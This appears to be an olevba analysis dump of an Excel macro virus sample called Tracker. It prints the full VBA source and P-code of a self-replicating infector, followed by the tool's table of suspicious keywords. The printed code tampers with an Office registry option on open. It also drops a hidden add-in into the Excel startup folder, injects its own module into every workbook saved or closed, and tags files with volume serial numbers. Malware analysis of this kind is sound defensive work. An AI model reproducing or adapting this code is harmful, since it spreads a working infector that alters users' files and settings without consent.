olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Tracker-based.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Tracker-based.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Private Const cstrSection     As String = "Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
Private Const cstrEngine      As String = "BASE5874.XLS"
Private Const cstrModule      As String = "ThisWorkbook"
Private Const cstrKeyName     As String = "Options6"
Private Const cstrVolumeData  As String = "IVID"

Private Declare Function GetVolumeInformation Lib "KERNEL32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As Long, ByVal nVolumeNameSize As Long, lpVolumeSerialNumber As Long, lpMaximumComponentLength As Long, lpFileSystemFlags As Long, ByVal lpFileSystemNameBuffer As Long, ByVal nFileSystemNameSize As Long) As Long
Private Declare Function RegCloseKey Lib "ADVAPI32.DLL" (ByVal hKey As Long) As Long
Private Declare Function RegOpenKeyEx Lib "ADVAPI32.DLL" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegQueryValueEx Lib "ADVAPI32.DLL" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long
Private Declare Function RegSetValueEx Lib "ADVAPI32.DLL" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long

Private WithEvents mapp As Application




Private Sub Workbook_Open()
  Dim strEngine     As String
  Dim wbkEngine     As Workbook
  Dim cmdEngine     As Object
  Dim lngRegKey     As Long
  Dim lngRegType    As Long
  Dim lngRegValue   As Long
  Dim lngVolumeID   As Long
  On Error Resume Next
  If (RegOpenKeyEx(&H80000001, cstrSection, 0, &H2001F, lngRegKey) = 0) Then
    RegQueryValueEx lngRegKey, cstrKeyName, 0, lngRegType, lngRegValue, 4
    RegSetValueEx lngRegKey, cstrKeyName, 0, lngRegType, lngRegValue And Not 8, 4
    RegCloseKey lngRegKey
  End If
  strEngine = UCase$(Application.StartupPath + "\" + cstrEngine)
  If UCase$(Me.FullName) = strEngine Then
    Set mapp = Application
  ElseIf Len(Dir(strEngine)) = 0 Then
    Application.ScreenUpdating = False
    If Len(Dir(Application.StartupPath, vbDirectory)) = 0 Then MkDir Application.StartupPath
    Set wbkEngine = Workbooks.Add
    wbkEngine.IsAddin = True
    Intrude wbkEngine
    GetVolumeInformation Left$(strEngine, InStr(1, strEngine, "\")), 0, 0, lngVolumeID, 0, 0, 0, 0
    wbkEngine.CustomDocumentProperties.Add cstrVolumeData + Hex$(lngVolumeID), False, msoPropertyTypeString, ""
    wbkEngine.SaveAs strEngine, xlAddIn
    wbkEngine.Close
    If (lngRegValue And 8) = 8 Then
      Set cmdEngine = Me.VBProject.VBComponents(cstrModule).CodeModule
      cmdEngine.DeleteLines 1, cmdEngine.CountOfLines
      Me.Save
    End If
    Application.ScreenUpdating = True
  Else
    CopyVolumesData Workbooks(cstrEngine)
  End If
End Sub

Private Sub mapp_WorkbookBeforeSave(ByVal Wb As Excel.Workbook, ByVal SaveAsUI As Boolean, Cancel As Boolean)
  On Error Resume Next
  Intrude Wb
End Sub

Private Sub mapp_WorkbookBeforeClose(ByVal Wb As Excel.Workbook, Cancel As Boolean)
  On Error Resume Next
  If Len(Wb.Path) <> 0 Then If Intrude(Wb) Then Wb.Save
End Sub

Private Function Intrude(wbkTarget As Workbook) As Boolean
  Dim cmdSource As Object
  Dim cmdTarget As Object
  On Error Resume Next
  Intrude = False
  Set cmdSource = Me.VBProject.VBComponents(cstrModule).CodeModule
  Set cmdTarget = wbkTarget.VBProject.VBComponents(cstrModule).CodeModule
  If cmdTarget.CountOfLines <= 2 Then
    cmdTarget.DeleteLines 1, cmdSource.CountOfLines
    cmdTarget.AddFromString cmdSource.Lines(1, cmdSource.CountOfLines)
    CopyVolumesData wbkTarget
    Intrude = True
  End If
End Function

Private Sub CopyVolumesData(wbkTarget As Workbook)
  Dim pptVolume As DocumentProperty
  On Error Resume Next
  For Each pptVolume In Me.CustomDocumentProperties
    If Left$(pptVolume.Name, Len(cstrVolumeData)) = cstrVolumeData Then
      wbkTarget.CustomDocumentProperties.Add pptVolume.Name, False, pptVolume.Type, ""
      wbkTarget.CustomDocumentProperties(pptVolume.Name).Value = pptVolume.Value
    End If
  Next
End Sub
-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: Virus.MSExcel.Tracker-based.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSExcel.Tracker-based.xls
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/ThisWorkbook - 12794 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' 	Dim (Private Const) 
' 	LitStr 0x0033 "Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	VarDefn cstrSection (As String) 0x001E
' Line #4:
' 	Dim (Private Const) 
' 	LitStr 0x000C "BASE5874.XLS"
' 	VarDefn cstrEngine (As String) 0x001E
' Line #5:
' 	Dim (Private Const) 
' 	LitStr 0x000C "ThisWorkbook"
' 	VarDefn cstrModule (As String) 0x001E
' Line #6:
' 	Dim (Private Const) 
' 	LitStr 0x0008 "Options6"
' 	VarDefn cstrKeyName (As String) 0x001E
' Line #7:
' 	Dim (Private Const) 
' 	LitStr 0x0004 "IVID"
' 	VarDefn cstrVolumeData (As String) 0x001E
' Line #8:
' Line #9:
' 	FuncDefn (Private Declare Function GetVolumeInformation Lib "KERNEL32" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As Long, ByVal nVolumeNameSize As Long, lpVolumeSerialNumber As Long, lpMaximumComponentLength As Long, lpFileSystemFlags As Long, ByVal lpFileSystemNameBuffer As Long, ByVal nFileSystemNameSize As Long) As Long)
' Line #10:
' 	FuncDefn (Private Declare Function RegCloseKey Lib "ADVAPI32.DLL" (ByVal hKey As Long) As Long)
' Line #11:
' 	FuncDefn (Private Declare Function RegOpenKeyEx Lib "ADVAPI32.DLL" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long)
' Line #12:
' 	FuncDefn (Private Declare Function RegQueryValueEx Lib "ADVAPI32.DLL" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As , lpcbData As Long) As Long)
' Line #13:
' 	FuncDefn (Private Declare Function RegSetValueEx Lib "ADVAPI32.DLL" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As , ByVal cbData As Long) As Long)
' Line #14:
' Line #15:
' 	Dim (Private) 
' 	VarDefn (WithEvents) mapp (As Application) 0x0000
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' 	FuncDefn (Private Sub Workbook_Open())
' Line #21:
' 	Dim 
' 	VarDefn strEngine (As String) 0x0014
' Line #22:
' 	Dim 
' 	VarDefn wbkEngine (As Workbook) 0x0014
' Line #23:
' 	Dim 
' 	VarDefn cmdEngine (As Object) 0x0014
' Line #24:
' 	Dim 
' 	VarDefn lngRegKey (As Long) 0x0014
' Line #25:
' 	Dim 
' 	VarDefn lngRegType (As Long) 0x0014
' Line #26:
' 	Dim 
' 	VarDefn lngRegValue (As Long) 0x0014
' Line #27:
' 	Dim 
' 	VarDefn lngVolumeID (As Long) 0x0014
' Line #28:
' 	OnError (Resume Next) 
' Line #29:
' 	LitHI4 0x0001 0x8000 
' 	Ld cstrSection 
' 	LitDI2 0x0000 
' 	LitHI4 0x001F 0x0002 
' 	Ld lngRegKey 
' 	ArgsLd RegOpenKeyEx 0x0005 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #30:
' 	Ld lngRegKey 
' 	Ld cstrKeyName 
' 	LitDI2 0x0000 
' 	Ld lngRegType 
' 	Ld lngRegValue 
' 	LitDI2 0x0004 
' 	ArgsCall RegQueryValueEx 0x0006 
' Line #31:
' 	Ld lngRegKey 
' 	Ld cstrKeyName 
' 	LitDI2 0x0000 
' 	Ld lngRegType 
' 	Ld lngRegValue 
' 	LitDI2 0x0008 
' 	Not 
' 	And 
' 	LitDI2 0x0004 
' 	ArgsCall RegSetValueEx 0x0006 
' Line #32:
' 	Ld lngRegKey 
' 	ArgsCall RegCloseKey 0x0001 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld cstrEngine 
' 	Add 
' 	ArgsLd UCase$ 0x0001 
' 	St strEngine 
' Line #35:
' 	Ld id_FFFF 
' 	MemLd FullName 
' 	ArgsLd UCase$ 0x0001 
' 	Ld strEngine 
' 	Eq 
' 	IfBlock 
' Line #36:
' 	SetStmt 
' 	Ld Application 
' 	Set mapp 
' Line #37:
' 	Ld strEngine 
' 	ArgsLd Dir 0x0001 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Eq 
' 	ElseIfBlock 
' Line #38:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #39:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Application 
' 	MemLd StartupPath 
' 	ArgsCall MkDir 0x0001 
' 	EndIf 
' Line #40:
' 	SetStmt 
' 	Ld Workbooks 
' 	MemLd Add 
' 	Set wbkEngine 
' Line #41:
' 	LitVarSpecial (True)
' 	Ld wbkEngine 
' 	MemSt IsAddin 
' Line #42:
' 	Ld wbkEngine 
' 	ArgsCall Intrude 0x0001 
' Line #43:
' 	Ld strEngine 
' 	LitDI2 0x0001 
' 	Ld strEngine 
' 	LitStr 0x0001 "\"
' 	FnInStr3 
' 	ArgsLd LBound$ 0x0002 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld lngVolumeID 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	ArgsCall GetVolumeInformation 0x0008 
' Line #44:
' 	Ld cstrVolumeData 
' 	Ld lngVolumeID 
' 	ArgsLd Hex$ 0x0001 
' 	Add 
' 	LitVarSpecial (False)
' 	Ld msoPropertyTypeString 
' 	LitStr 0x0000 ""
' 	Ld wbkEngine 
' 	MemLd CustomDocumentProperties 
' 	ArgsMemCall Add 0x0004 
' Line #45:
' 	Ld strEngine 
' 	Ld xlAddIn 
' 	Ld wbkEngine 
' 	ArgsMemCall SaveAs 0x0002 
' Line #46:
' 	Ld wbkEngine 
' 	ArgsMemCall Close 0x0000 
' Line #47:
' 	Ld lngRegValue 
' 	LitDI2 0x0008 
' 	And 
' 	Paren 
' 	LitDI2 0x0008 
' 	Eq 
' 	IfBlock 
' Line #48:
' 	SetStmt 
' 	Ld cstrModule 
' 	Ld id_FFFF 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set cmdEngine 
' Line #49:
' 	LitDI2 0x0001 
' 	Ld cmdEngine 
' 	MemLd CountOfLines 
' 	Ld cmdEngine 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #50:
' 	Ld id_FFFF 
' 	ArgsMemCall Save 0x0000 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #53:
' 	ElseBlock 
' Line #54:
' 	Ld cstrEngine 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsCall CopyVolumesData 0x0001 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	EndSub 
' Line #57:
' Line #58:
' 	FuncDefn (Private Sub mapp_WorkbookBeforeSave(ByVal Wb As , ByVal SaveAsUI As Boolean, Cancel As Boolean))
' Line #59:
' 	OnError (Resume Next) 
' Line #60:
' 	Ld Wb 
' 	ArgsCall Intrude 0x0001 
' Line #61:
' 	EndSub 
' Line #62:
' Line #63:
' 	FuncDefn (Private Sub mapp_WorkbookBeforeClose(ByVal Wb As , Cancel As Boolean))
' Line #64:
' 	OnError (Resume Next) 
' Line #65:
' 	Ld Wb 
' 	MemLd Path 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Wb 
' 	ArgsLd Intrude 0x0001 
' 	If 
' 	BoSImplicit 
' 	Ld Wb 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' 	EndIf 
' Line #66:
' 	EndSub 
' Line #67:
' Line #68:
' 	FuncDefn (Private Function Intrude(wbkTarget As , id_FFFE As Boolean) As Boolean)
' Line #69:
' 	Dim 
' 	VarDefn cmdSource (As Object)
' Line #70:
' 	Dim 
' 	VarDefn cmdTarget (As Object)
' Line #71:
' 	OnError (Resume Next) 
' Line #72:
' 	LitVarSpecial (False)
' 	St Intrude 
' Line #73:
' 	SetStmt 
' 	Ld cstrModule 
' 	Ld id_FFFF 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set cmdSource 
' Line #74:
' 	SetStmt 
' 	Ld cstrModule 
' 	Ld wbkTarget 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set cmdTarget 
' Line #75:
' 	Ld cmdTarget 
' 	MemLd CountOfLines 
' 	LitDI2 0x0002 
' 	Le 
' 	IfBlock 
' Line #76:
' 	LitDI2 0x0001 
' 	Ld cmdSource 
' 	MemLd CountOfLines 
' 	Ld cmdTarget 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #77:
' 	LitDI2 0x0001 
' 	Ld cmdSource 
' 	MemLd CountOfLines 
' 	Ld cmdSource 
' 	ArgsMemLd Lines 0x0002 
' 	Ld cmdTarget 
' 	ArgsMemCall AddFromString 0x0001 
' Line #78:
' 	Ld wbkTarget 
' 	ArgsCall CopyVolumesData 0x0001 
' Line #79:
' 	LitVarSpecial (True)
' 	St Intrude 
' Line #80:
' 	EndIfBlock 
' Line #81:
' 	EndFunc 
' Line #82:
' Line #83:
' 	FuncDefn (Private Sub CopyVolumesData(wbkTarget As ))
' Line #84:
' 	Dim 
' 	VarDefn pptVolume (As DocumentProperty)
' Line #85:
' 	OnError (Resume Next) 
' Line #86:
' 	StartForVariable 
' 	Ld pptVolume 
' 	EndForVariable 
' 	Ld id_FFFF 
' 	MemLd CustomDocumentProperties 
' 	ForEach 
' Line #87:
' 	Ld pptVolume 
' 	MemLd New 
' 	Ld cstrVolumeData 
' 	FnLen 
' 	ArgsLd LBound$ 0x0002 
' 	Ld cstrVolumeData 
' 	Eq 
' 	IfBlock 
' Line #88:
' 	Ld pptVolume 
' 	MemLd New 
' 	LitVarSpecial (False)
' 	Ld pptVolume 
' 	MemLd TypeOf 
' 	LitStr 0x0000 ""
' 	Ld wbkTarget 
' 	MemLd CustomDocumentProperties 
' 	ArgsMemCall Add 0x0004 
' Line #89:
' 	Ld pptVolume 
' 	MemLd Value 
' 	Ld pptVolume 
' 	MemLd New 
' 	Ld wbkTarget 
' 	ArgsMemLd CustomDocumentProperties 0x0001 
' 	MemSt Value 
' Line #90:
' 	EndIfBlock 
' Line #91:
' 	StartForVariable 
' 	Next 
' Line #92:
' 	EndSub 
' _VBA_PROJECT_CUR/VBA/Лист1 - 1183 bytes
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegOpenKeyEx        |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|RegQueryValueExA    |May read registry keys                       |
|Suspicious|RegQueryValueEx     |May read registry keys                       |
|Suspicious|GetVolumeInformation|May detect Anubis Sandbox                    |
|          |A                   |                                             |
|Suspicious|GetVolumeInformation|May detect Anubis Sandbox                    |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |ADVAPI32.DLL        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

